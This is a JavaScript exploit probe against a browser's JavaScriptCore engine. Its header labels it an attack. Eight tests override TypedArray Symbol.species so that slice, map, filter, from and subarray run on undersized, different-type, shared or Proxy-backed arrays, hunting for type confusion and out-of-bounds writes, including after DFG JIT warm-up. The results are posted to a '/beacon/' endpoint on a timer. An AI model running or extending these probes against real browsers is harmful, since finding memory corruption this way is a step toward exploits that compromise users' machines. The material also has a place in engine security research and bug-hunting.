/* p82-species — TypedArray Symbol.species type confusion
 *
 * D8 confirmed: Symbol.species, Symbol.toPrimitive, valueOf all hijackable
 * on TypedArray prototypes and constructors.
 *
 * ATTACK: Override TypedArray[Symbol.species] to return a constructor that
 * creates a SMALLER or DIFFERENT typed array. If slice/map/filter copies
 * using source length instead of destination length → OOB write.
 *
 * This targets NON-Gigacage memory because the species-created array
 * is a fresh allocation — its backing store is a normal AB in Gigacage,
 * but if the COPY overflows, it writes past the AB's allocation.
 *
 * Beacon prefix: V82S-
 */
(function(){
"use strict";
var RUN_ID = "v82s" + Math.random().toString(36).slice(2,12);
var PREFIX = "V82S-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press82-species attack");

/* ====== S1: slice() with tiny species ====== */
function test_S1() {
  var r = {};
  try {
    var src = new Uint8Array(256);
    for (var i = 0; i < 256; i++) src[i] = 0xAA;

    // Override species to return tiny buffer constructor
    var origSpecies = Uint8Array[Symbol.species];
    var speciesCalled = false;

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() {
        speciesCalled = true;
        return function TinyArray(len) {
          // Spec says: species constructor is called with (len)
          // We return a 4-byte array instead of len-byte
          return new Uint8Array(4);
        };
      }, configurable: true
    });

    try {
      var result = src.slice(0);
      r.speciesCalled = speciesCalled;
      r.resultLen = result.length;
      r.resultType = result.constructor.name;
      r.resultByte0 = result[0];

      // If result is 4 bytes but slice copied 256 bytes → OOB!
      // Check if result's buffer is larger than expected
      r.bufLen = result.buffer.byteLength;
      r.OOB_SLICE = result.buffer.byteLength < 256 && result[0] === 0xAA;

    } catch(e) {
      r.sliceErr = e.name + ":" + e.message.slice(0,60);
    }

    // Restore
    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() { return Uint8Array; }, configurable: true
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S1-SLICE-TINY", r);
}

/* ====== S2: slice() species returns different type ====== */
function test_S2() {
  var r = {};
  try {
    var src = new Uint8Array(64);
    for (var i = 0; i < 64; i++) src[i] = i;

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() {
        // Return Float64Array — 8 bytes per element vs 1
        return Float64Array;
      }, configurable: true
    });

    try {
      var result = src.slice(0);
      r.resultType = result.constructor.name;
      r.resultLen = result.length;
      r.bufLen = result.buffer.byteLength;
      r.elemSize = result.BYTES_PER_ELEMENT;

      // If Float64Array with length 64 → 512 bytes (64 * 8)
      // But only 64 bytes of source data — what fills the rest?
      if (result.length > 0) {
        r.val0 = result[0];
        r.val0Hex = result[0].toString(16);
      }

      // Check for type confusion: does JSC treat result as Uint8Array internally?
      r.TYPE_CONFUSED = result instanceof Float64Array && result.BYTES_PER_ELEMENT === 8;

    } catch(e) {
      r.sliceErr = e.name + ":" + e.message.slice(0,60);
    }

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() { return Uint8Array; }, configurable: true
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S2-SLICE-TYPE", r);
}

/* ====== S3: map() species returns shared buffer ====== */
function test_S3() {
  var r = {};
  try {
    // Create a target buffer we control
    var targetBuf = new ArrayBuffer(16);
    var targetView = new Uint8Array(targetBuf);
    for (var i = 0; i < 16; i++) targetView[i] = 0;

    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0xBB;

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() {
        return function SharedCtor(len) {
          // Return a view on OUR buffer (16 bytes) regardless of requested len
          return new Uint8Array(targetBuf, 0, Math.min(len, 16));
        };
      }, configurable: true
    });

    try {
      var result = src.map(function(v) { return v; });
      r.resultLen = result.length;
      r.targetByte0 = targetView[0]; // did map write to our target buffer?
      r.targetByte15 = targetView[15];
      r.SHARED_WRITE = targetView[0] === 0xBB; // map wrote to our buffer!

      // Check if map wrote MORE than 16 bytes (would need to read past targetBuf)
      // Can't directly check, but if no crash, it stopped at the destination size

    } catch(e) {
      r.mapErr = e.name + ":" + e.message.slice(0,60);
    }

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() { return Uint8Array; }, configurable: true
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S3-MAP-SHARED", r);
}

/* ====== S4: filter() species returns tiny buffer ====== */
function test_S4() {
  var r = {};
  try {
    var src = new Uint8Array(128);
    for (var i = 0; i < 128; i++) src[i] = 0xCC;

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() {
        return function(len) {
          return new Uint8Array(4); // way too small
        };
      }, configurable: true
    });

    try {
      var result = src.filter(function(v) { return true; }); // all elements pass
      r.resultLen = result.length;
      r.bufLen = result.buffer.byteLength;
      r.byte0 = result[0];
      r.OOB_FILTER = result.buffer.byteLength < 128 && result[0] === 0xCC;
    } catch(e) {
      r.filterErr = e.name + ":" + e.message.slice(0,60);
    }

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() { return Uint8Array; }, configurable: true
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S4-FILTER-TINY", r);
}

/* ====== S5: Species returns non-TypedArray (Proxy) ====== */
function test_S5() {
  var r = {};
  try {
    var src = new Uint8Array(64);
    for (var i = 0; i < 64; i++) src[i] = i;

    var writes = [];
    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() {
        return function(len) {
          // Return a Proxy that logs all writes
          var backing = new Uint8Array(len);
          return new Proxy(backing, {
            set: function(target, prop, value) {
              if (writes.length < 20) writes.push(prop + "=" + value);
              target[prop] = value;
              return true;
            },
            get: function(target, prop) {
              return target[prop];
            }
          });
        };
      }, configurable: true
    });

    try {
      var result = src.slice(0);
      r.resultLen = result.length;
      r.writeCount = writes.length;
      r.writeSample = writes.slice(0,5).join("|");
      r.PROXY_ACCEPTED = true;
    } catch(e) {
      r.sliceErr = e.name + ":" + e.message.slice(0,60);
      r.PROXY_ACCEPTED = false;
    }

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() { return Uint8Array; }, configurable: true
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S5-PROXY-SPECIES", r);
}

/* ====== S6: Species + DFG JIT ====== */
function test_S6() {
  var r = {};
  try {
    // Warm up slice with normal species
    var warmSrc = new Uint8Array(32);
    for (var w = 0; w < 32; w++) warmSrc[w] = w;

    function doSlice(arr) { return arr.slice(0); }

    // Warm DFG
    for (var i = 0; i < 15000; i++) doSlice(warmSrc);
    r.warmOK = true;

    // Now swap species — DFG compiled code might use stale constructor
    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() {
        return function(len) { return new Uint8Array(2); };
      }, configurable: true
    });

    try {
      var result = doSlice(warmSrc);
      r.jitResultLen = result.length;
      r.jitBufLen = result.buffer.byteLength;
      r.byte0 = result[0];
      r.JIT_BYPASSED = result.buffer.byteLength === 2;
      r.JIT_OOB = result.buffer.byteLength < 32 && result[0] === 0;
    } catch(e) {
      r.jitErr = e.name + ":" + e.message.slice(0,60);
    }

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() { return Uint8Array; }, configurable: true
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S6-DFG-SPECIES", r);
}

/* ====== S7: from() with species + length confusion ====== */
function test_S7() {
  var r = {};
  try {
    var src = new Uint8Array(128);
    for (var i = 0; i < 128; i++) src[i] = 0xDD;

    // TypedArray.from() also uses species
    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() {
        return function(len) { return new Uint8Array(8); };
      }, configurable: true
    });

    try {
      var result = Uint8Array.from(src);
      r.resultLen = result.length;
      r.bufLen = result.buffer.byteLength;
      r.byte0 = result[0];
      r.OOB_FROM = result.buffer.byteLength < 128;
    } catch(e) {
      r.fromErr = e.name + ":" + e.message.slice(0,60);
    }

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() { return Uint8Array; }, configurable: true
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S7-FROM-SPECIES", r);
}

/* ====== S8: subarray() species ====== */
function test_S8() {
  var r = {};
  try {
    var src = new Uint8Array(256);
    for (var i = 0; i < 256; i++) src[i] = i;

    // subarray returns a view on the same buffer — what if species changes the type?
    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() {
        return Float64Array; // 8 bytes per element
      }, configurable: true
    });

    try {
      var result = src.subarray(0, 64); // 64 elements of src
      r.resultType = result.constructor.name;
      r.resultLen = result.length;
      r.bufLen = result.buffer.byteLength;
      r.elemSize = result.BYTES_PER_ELEMENT;
      r.byte0 = result[0];

      // subarray should share the same buffer
      r.sameBuffer = result.buffer === src.buffer;
      r.SUBARRAY_CONFUSED = result.BYTES_PER_ELEMENT !== 1;
    } catch(e) {
      r.subErr = e.name + ":" + e.message.slice(0,60);
    }

    Object.defineProperty(Uint8Array, Symbol.species, {
      get: function() { return Uint8Array; }, configurable: true
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S8-SUBARRAY", r);
}

/* ====== Run ====== */
try {
  test_S1();
  setTimeout(test_S2, 200);
  setTimeout(test_S3, 400);
  setTimeout(test_S4, 600);
  setTimeout(test_S5, 800);
  setTimeout(test_S6, 1000);
  setTimeout(test_S7, 1200);
  setTimeout(test_S8, 1400);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2500);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe82-done"); }, 18000);
})();
